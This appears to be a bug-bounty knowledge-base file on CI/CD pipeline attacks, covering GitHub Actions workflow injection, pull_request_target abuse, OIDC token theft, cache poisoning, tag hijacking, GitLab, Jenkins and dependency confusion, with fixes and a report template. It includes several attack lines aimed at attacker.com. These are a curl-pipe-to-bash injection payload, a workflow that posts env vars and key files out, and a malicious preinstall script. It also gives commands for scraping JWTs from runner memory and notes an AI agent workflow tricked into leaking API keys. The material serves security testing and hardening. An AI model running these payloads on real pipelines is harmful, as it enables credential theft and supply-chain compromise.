# CI/CD Pipeline Attacks — GitHub Actions, GitLab, Jenkins, Supply Chain
> Source: CSA Megalodon research, Endor Labs npm OIDC analysis, Tinder GHA+AWS OIDC research, Microsoft Claude Code GHA disclosure, OWASP CI/CD Security | RAG Knowledge Base | Full detail preserved
> CWE: CWE-829 (Untrusted Control Sphere), CWE-494 (Download of Code Without Integrity Check), CWE-269 (Improper Privilege Management)
> Related: `bug-chains.md` (CHAIN-019), `cloud-attacks.md`, `chain-builder.md`

---

## Overview — Why CI/CD Is Critical Bug Bounty Surface

CI/CD pipelines hold keys to:
- Cloud infrastructure (AWS/GCP/Azure via OIDC or static keys)
- Package registries (npm, PyPI, RubyGems, Maven)
- Container registries (ECR, GCR, Docker Hub)
- Production deployment credentials
- Code signing certificates

**A compromised CI runner = full access to everything that job's token can reach.**

Modern attack model: **Direct Poisoned Pipeline Execution (d-PPE)** — attacker with write access (or ability to trigger workflows) modifies `.github/workflows/` to execute arbitrary code in CI context. No platform vulnerability required — permission model abuse.

**2025-2026 incident patterns:**
- Megalodon (May 2026): 5,561 repos poisoned via workflow injection
- Trivy-action tag hijack (March 2026): mutable `@v*` tags redirected to malicious code
- npm OIDC trusted publisher abuse via `pull_request_target` + cache poisoning
- Mini Shai-Hulud: GitHub Actions OIDC to publish malicious npm packages

---

## Attack Surface Map

```
Repository layer
├── .github/workflows/*.yml          ← workflow definitions (HIGH VALUE)
├── .gitlab-ci.yml
├── Jenkinsfile
├── action.yml (custom actions)
└── CODEOWNERS / branch protection gaps

Runner layer
├── GITHUB_TOKEN / CI_JOB_TOKEN
├── OIDC tokens (short-lived, in memory)
├── Environment secrets / Variables
├── Cloud metadata (if self-hosted on cloud VM)
└── /proc/self/environ, filesystem secrets

Registry / Cloud layer
├── npm/PyPI trusted publishing (OIDC)
├── AWS IAM role assumption via OIDC
├── GCP Workload Identity Federation
├── Azure Federated Credentials
└── Container push to ECR/GCR
```

---

## GitHub Actions — Core Concepts

### Trigger Types (Attack Relevance)

| Trigger | Runs when | Trust level | Risk |
|---|---|---|---|
| `push` | Code pushed to branch | Branch protection dependent | Medium-High |
| `pull_request` | PR opened/sync (fork: read-only token) | Limited for forks | Lower |
| `pull_request_target` | PR events, runs in BASE repo context | **FULL secrets for fork PRs** | **CRITICAL** |
| `workflow_dispatch` | Manual/API trigger | Full secrets | High if API token leaked |
| `issue_comment` | Comment on issue/PR | Depends on `if:` guards | High if runs untrusted code |
| `schedule` | Cron | Full secrets | Medium |
| `repository_dispatch` | External webhook | Full secrets | High if token exposed |

### GITHUB_TOKEN Permissions
```yaml
permissions:
  contents: read        # Minimum needed
  id-token: write         # Required for OIDC
  packages: write         # npm/container publish
  pull-requests: write
```

Default token is over-permissioned in older repos. Always declare minimum `permissions:`.

### OIDC Token Flow
```
1. Workflow declares permissions: id-token: write
2. Job requests JWT from https://pipelines.actions.githubusercontent.com
   (ACTIONS_ID_TOKEN_REQUEST_URL + ACTIONS_ID_TOKEN_REQUEST_TOKEN)
3. JWT presented to cloud/registry (AWS STS, npm, etc.)
4. Short-lived credential returned
5. Token exists IN RUNNER MEMORY — extractable if code execution achieved
```

**JWT claims (typical):**
```json
{
  "sub": "repo:org/repo:ref:refs/heads/main",
  "repository": "org/repo",
  "ref": "refs/heads/main",
  "workflow": "release.yml",
  "environment": "production"
}
```

---

## Attack Class 1: Workflow Injection (Expression Injection)

**CWE-94** | User-controlled input evaluated in `${{ }}` expressions

### Mechanism
GitHub Actions expressions can reference event data. If untrusted content flows into `run:` script via expression evaluation:

```yaml
# VULNERABLE
- name: Greet
  run: echo "${{ github.event.issue.title }}"
```

**Payload in issue title:**
```
"; curl https://attacker.com/s.sh | bash; echo "
```

Results in:
```bash
echo ""; curl https://attacker.com/s.sh | bash; echo ""
```

### High-Risk Injection Points
| Source | Expression |
|---|---|
| Issue title | `github.event.issue.title` |
| Issue body | `github.event.issue.body` |
| PR title | `github.event.pull_request.title` |
| PR body | `github.event.pull_request.body` |
| Comment body | `github.event.comment.body` |
| Branch name | `github.head_ref` |
| Commit message | `github.event.head_commit.message` |
| Actor login | `github.actor` (usually safe but test) |

### Real-World Pattern (Claude Code Action, 2026)
AI agent workflows processing issue/PR bodies with file-read tools accessing `/proc/self/environ` → API key exfiltration. Agentic CI expands injection surface.

### Testing
1. Find workflows triggered by `issues`, `issue_comment`, `pull_request_target`
2. Open issue/PR with injection payload in title/body
3. Monitor callback (Burp Collaborator, webhook.site)
4. Check workflow run logs for execution

### Impact
- Secret exfiltration from runner environment
- OIDC token theft
- Repository modification using GITHUB_TOKEN
- Critical

---

## Attack Class 2: pull_request_target Abuse (Pwn Request)

**Most dangerous GitHub Actions misconfiguration**

### Mechanism
`pull_request_target` runs workflow from **default branch** version but with **PR metadata** — and grants **write access + secrets** even for **fork PRs**.

```yaml
# VULNERABLE PATTERN
on:
  pull_request_target:
    types: [opened, synchronize]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # CHECKS OUT UNTRUSTED CODE
      - run: make test  # Executes attacker's Makefile
```

### Attack Chain (npm OIDC Case Study — 2026)
1. Attacker forks repo, submits PR modifying `package.json` or adding malicious script
2. `pull_request_target` workflow runs with `id-token: write` + npm publish capability
3. Attacker code executes on runner
4. Attacker dumps `Runner.Worker` memory → extracts OIDC JWT
5. Direct API call to `registry.npmjs.org` with stolen JWT → publish malicious package

**Maintainer never compromised. npm credentials never stolen. OIDC binding bypassed via CI code execution.**

### Safe Alternatives
- Use `pull_request` (not `_target`) for untrusted code — limited token for forks
- Split: `_target` for label/comment only (no checkout of PR code)
- Require `workflow_run` pattern for trusted follow-up
- Never checkout `github.event.pull_request.head.sha` in `_target` without isolation

### Testing
1. Fork target repo
2. Add benign callback in PR (curl collaborator)
3. Submit PR → observe if `_target` workflow runs and executes your code
4. Check if secrets/OIDC permissions present in workflow

### Impact
- Supply chain compromise
- Critical

---

## Attack Class 3: OIDC Token Theft from Runner Memory

### Mechanism
OIDC JWT minted in-process when step requests it. Not in secrets store — lives in `Runner.Worker` memory until used.

**Extraction techniques (observed in wild):**
```bash
# Process memory dump
grep -a "eyJ" /proc/$(pgrep Runner.Worker)/mem
# Strings scan of worker process
strings /proc/$(pgrep -Worker)/mem | grep eyJ
```

Custom binary in PR (`.so`, compiled binary) performs memory scan — harder for regex detection.

### What Stolen OIDC Enables
| Target | Action |
|---|---|
| npm trusted publisher | Publish packages as maintainer |
| AWS IAM role | AssumeRole → cloud access |
| GCP WIF | Access GCP resources |
| Azure | Federated credential access |
| PyPI trusted publishing | Poison Python packages |

### Misconfigured AWS Trust Policy (Tinder Research)
```json
{
  "Effect": "Allow",
  "Principal": {"Federated": "arn:aws:iam::ACCOUNT:oidc-provider/token.actions.githubusercontent.com"},
  "Action": "sts:AssumeRoleWithWebIdentity",
  "Condition": {
    "StringEquals": {
      "token.actions.githubusercontent.com:aud": "sts.amazonaws.com"
    }
  }
}
```

**Missing `sub` claim restriction** → ANY GitHub repo can assume role:
```json
"Condition": {
  "StringLike": {
    "token.actions.githubusercontent.com:sub": "repo:TARGET_ORG/TARGET_REPO:*"
  }
}
```

Also restrict: `ref:`, `environment:`, `workflow:`

### Testing OIDC Misconfiguration (Black-Box)
1. Identify repos with AWS/GCP deployment workflows
2. Check if workflow files public (`.github/workflows/deploy.yml`)
3. Look for `role-to-assume`, `id-token: write`
4. If you achieve code execution in workflow → attempt memory extraction PoC
5. For trust policy: if you can run workflow in target org repo → test cross-repo assumption

---

## Attack Class 4: GitHub Actions Cache Poisoning

### Mechanism
GitHub Actions cache shared across workflow runs. Key derived from cache key + branch scope.

**Cross-PR cache poisoning:**
1. Attacker PR (via `pull_request_target`) writes poisoned cache entry
2. Legitimate `push` to main workflow restores poisoned cache
3. Poisoned artifact executes in trusted context

```yaml
- uses: actions/cache@v4
  with:
    path: node_modules
    key: ${{ runner.os }}-build-${{ hashFiles('**/package-lock.json') }}
```

If attacker controls `node_modules` content in cache → code runs on next main branch build.

### Impact
- Trusted branch code execution
- Chains to OIDC theft / secret access
- Critical in `_target` + cache scenarios

---

## Attack Class 5: Mutable Action Tag Hijacking

### Mechanism
Workflow references action by tag:
```yaml
uses: aquasecurity/trivy-action@0.31.0  # Tag can be moved!
uses: tj-actions/changed-files@v45        # v45 retargeted to malicious commit
```

Attacker compromises action repo (or typosquats) → retag → all downstream workflows pull malicious code.

### Safe Pattern
```yaml
uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
```

Pin to **immutable commit SHA**, not tag or branch.

### Real Incidents
- `tj-actions/changed-files` (March 2025): ~23,000 repos affected
- `aquasecurity/trivy-action` (March 2026): cloud credential harvest
- Megalodon: injected entirely new workflow files

### Bug Bounty Angle
- Report mutable pins in target's workflows as misconfiguration
- If you find supply chain vuln in action they use → chain to secret theft PoC

---

## Attack Class 6: Direct Pipeline Poisoning (d-PPE / Megalodon Pattern)

### Requirements
- Write access to repository (compromised PAT, collaborator, or weak branch protection)
- OR ability to push to `.github/workflows/` without review

### Attack
```yaml
# Injected: .github/workflows/ci-diag.yml
name: CI Diagnostics
on: [push, pull_request]
jobs:
  diag:
    runs-on: ubuntu-latest
    steps:
      - run: |
          curl -s https://attacker.com/collect -d "@-">/dev/null <<EOF
          $(env | base64)
          $(find . -name '*.pem' -o -name '.env' 2>/dev/null | head -20)
          EOF
```

**Megalodon payload categories harvested (30+):**
- AWS keys (IMDSv1/v2)
- GCP OAuth tokens
- Azure managed identity
- SSH private keys
- Kubeconfig
- Vault tokens
- Terraform state credentials
- GitHub OIDC tokens
- Regex scan: API keys, JWTs, DB connection strings

### Dormant Backdoor Variant
```yaml
on:
  workflow_dispatch:  # Attacker triggers via API when ready
```

### Testing (Authorized Programs Only)
1. Check branch protection on `.github/workflows/`
2. Can external contributors push workflow changes without review?
3. Are CODEOWNERS assigned to workflow paths?
4. Report missing protections — don't inject real malware

---

## Attack Class 7: Self-Hosted Runner Abuse

### Risks
- Runners on corporate network → pivot to internal resources
- Runners persist between jobs → secret leakage across repos
- Fork PR runs on self-hosted runner with network access
- Runner registration token exposure → attacker registers rogue runner

### Attack: Rogue Runner Registration
1. Leak `RUNNER_TOKEN` or org admin PAT
2. Register attacker-controlled runner with `runs-on: self-hosted` label
3. All jobs with that label execute on attacker machine → all secrets

### Testing
1. Identify `runs-on: self-hosted` in public workflows
2. Check if fork PRs can trigger jobs on self-hosted runners
3. Report if untrusted code runs on persistent self-hosted runners

---

## Attack Class 8: Environment Protection Bypass

```yaml
jobs:
  deploy:
    environment: production  # Should require approval
    steps:
      - run: deploy.sh
```

**Bypass patterns:**
- Deploy job triggered from fork via `_target` without environment gate
- Environment secrets accessible from non-protected branch
- `workflow_dispatch` on default branch skips reviewers

---

## GitLab CI — Attack Patterns

### CI/CD Variable Exposure
```yaml
# .gitlab-ci.yml
deploy:
  script:
    - curl -H "PRIVATE-TOKEN: $CI_JOB_TOKEN" https://gitlab.com/api/v4/projects
```

- `CI_JOB_TOKEN` scoped to project — but can access other projects if permissions misconfigured
- Masked variables leak in job logs if not properly masked
- `artifacts:reports:dotenv` passes secrets between jobs

### Pipeline Trigger Token
```bash
curl -X POST -F token=TOKEN -F ref=main https://gitlab.com/api/v4/projects/ID/trigger/pipeline
```

Exposed trigger token → arbitrary pipeline execution with project secrets.

### Include from External Project
```yaml
include:
  - project: 'external/templates'
    file: '/ci/deploy.yml'
```

If external project compromised → supply chain.

### Protected Branch Bypass
- Merge request from fork runs merge request pipeline with limited token
- "Merge when pipeline succeeds" race conditions
- Maintainer approval bypass via CI configuration changes in MR

### Testing
1. Find `.gitlab-ci.yml` in public repo
2. Identify secrets usage, `CI_JOB_TOKEN` API calls
3. Check MR pipeline permissions for forks
4. Search for exposed trigger tokens in commits (gitleaks)

---

## Jenkins — Attack Patterns

### Script Console
`/script` — Groovy RCE if admin access:
```groovy
"whoami".execute().text
```

### Unauthenticated Access
- `/api/json` — information disclosure
- `/credentials/store/system/domain/_/credential/` — if exposed
- Build logs contain injected secrets

### Pipeline Groovy Injection
```groovy
// If user input in Groovy string
sh "${user_input}"  // Command injection
```

### CVE Patterns
- Stapler web framework deserialization
- Authorized users → Script Console → RCE
- Exposed agents connect to controller

### Testing
1. Identify Jenkins: `X-Jenkins` header, `/login`, port 8080
2. Check anonymous read access
3. Search for build log exposure
4. Script Console if credentialed

---

## ArgoCD — Attack Patterns

### Exposed API/UI
- Default admin password (if not changed)
- `/api/v1/session` — token acquisition
- `/api/v1/applications` — deploy to cluster

### RBAC Misconfiguration
- Default project allows any authenticated user to sync apps
- App-of-apps pattern with excessive permissions

### Repository Credential Exposure
- Git repo credentials in ArgoCD secrets
- Helm chart repos with deploy keys

### Testing
1. Find `argocd.example.com` subdomains
2. Check version, default creds (authorized testing only)
3. Report exposed admin panels

---

## CircleCI / Travis CI (Legacy)

### CircleCI
- Context secrets shared across projects — over-sharing
- `CIRCLE_TOKEN` in environment → API access
- Orbs supply chain (similar to GHA actions)

### Travis CI
- Encrypted env vars in `.travis.yml` — decrypt with repo access
- `travis encrypt` secrets in public repos visible to collaborators

---

## Dependency Confusion / Package Squatting

### Mechanism
1. Identify private package names from JS bundles, Dockerfile, CI logs
2. Register same name on public registry (npm, PyPI)
3. Public registry version higher than private → package manager pulls public
4. CI/CD installs attacker's package → code execution during install scripts

```json
// Attacker publishes to npm
{
  "name": "@target-corp/internal-utils",
  "version": "99.0.0",
  "scripts": { "preinstall": "curl attacker.com/s | sh" }
}
```

### Testing
1. Extract private package names from public artifacts
2. Check if name exists on public registry
3. Report naming collision risk (don't actually squat in unauthorized testing)

---

## Secret Scanning in CI Context

### Where Secrets Hide
```
.env files committed then deleted (git history)
Workflow logs (echo secrets if misconfigured)
Artifact uploads
Docker layer history
Fork PR build logs (if _target)
/core/payload.js in published npm packages (Megalodon pattern)
```

### Tools
- trufflehog, gitleaks, noseyparker
- GitHub secret scanning alerts (check if disabled)
- `/secrets-hunt --js-bundle`

---

## CI/CD Recon Checklist

```
[ ] Locate CI config: .github/workflows/, .gitlab-ci.yml, Jenkinsfile
[ ] List workflow triggers — especially pull_request_target
[ ] Check permissions: id-token: write, packages: write, contents: write
[ ] Find OIDC cloud deployment (AWS role ARN, GCP provider)
[ ] Check action pinning — tags vs SHAs
[ ] Branch protection on default branch AND .github/workflows/
[ ] CODEOWNERS for workflow paths
[ ] Self-hosted runners referenced?
[ ] Environment protection on production deploys?
[ ] Custom actions in repo (action.yml)?
[ ] CI logs / artifacts publicly accessible?
[ ] Dependabot/GitHub Actions update config
[ ] npm/PyPI trusted publisher config (if public monorepo)
```

---

## Remediation Summary (For Reports)

| Issue | Fix |
|---|---|
| pull_request_target abuse | Remove or split; never checkout untrusted code |
| Workflow injection | Sanitize; don't embed event data in run scripts |
| Mutable action tags | Pin to commit SHA |
| Over-permissioned GITHUB_TOKEN | Declare minimum permissions |
| OIDC trust policy | Restrict sub, ref, environment, workflow |
| No workflow review | Branch protection + CODEOWNERS on .github/workflows/ |
| Cache poisoning | Scope cache keys; isolate fork PR caches |
| Long-lived secrets in CI | Migrate to OIDC workload identity |
| Self-hosted runner on fork PRs | Restrict labels; ephemeral runners |

---

## Bug Bounty Reporting Template

```markdown
## Summary
Misconfigured pull_request_target workflow in repo X allows arbitrary code execution with id-token:write, enabling OIDC token theft and unauthorized npm package publication.

## Steps
1. Fork repository
2. Submit PR adding test script to package.json postinstall
3. pull_request_target workflow executes with secrets/OIDC scope
4. [PoC: callback to collaborator — no actual exfil of real secrets]

## Impact
Supply chain compromise — attacker can publish packages as @scope/pkg using trusted publisher identity.

## CWE
CWE-829: Inclusion of Functionality from Untrusted Control Sphere

## Remediation
Replace pull_request_target with pull_request for untrusted code paths.
Remove id-token:write from workflows that process fork PRs.
Pin actions to commit SHAs.
```

---

## Severity Guide

| Finding | Typical Severity |
|---|---|
| pull_request_target + OIDC + fork PR code exec | Critical |
| Workflow injection in public issue-triggered workflow | High-Critical |
| Mutable action pin on deploy workflow | High |
| Missing branch protection on workflows (write access required) | Medium-High |
| Over-permissioned GITHUB_TOKEN (no exploit chain) | Medium |
| OIDC trust policy missing sub restriction (needs PoC) | High-Critical |
| Self-hosted runner on fork PRs | Critical |
| Leaked CI token in public log | High-Critical |

---

## Chain References

See `bug-chains.md`:
- **CHAIN-019:** Workflow injection → OIDC theft → registry/cloud
- **CHAIN-003:** SSRF → internal Jenkins → RCE
- **CHAIN-002:** SSRF from CI webhook → IMDS

See `cloud-attacks.md`:
- AWS IAM OIDC trust policies
- IMDS credential theft from cloud-hosted runners

---

## References

- CSA Megalodon Research Note (May 2026)
- Endor Labs — npm OIDC supply chain compromise analysis
- Tinder Security Labs — GitHub Actions + AWS OIDC misconfigurations
- Microsoft — Securing CI/CD in agentic world (Claude Code Action)
- OWASP CI/CD Security Top 10
- GitHub Security Hardening Guide
- CWE-829, CWE-494, CWE-269, CWE-798
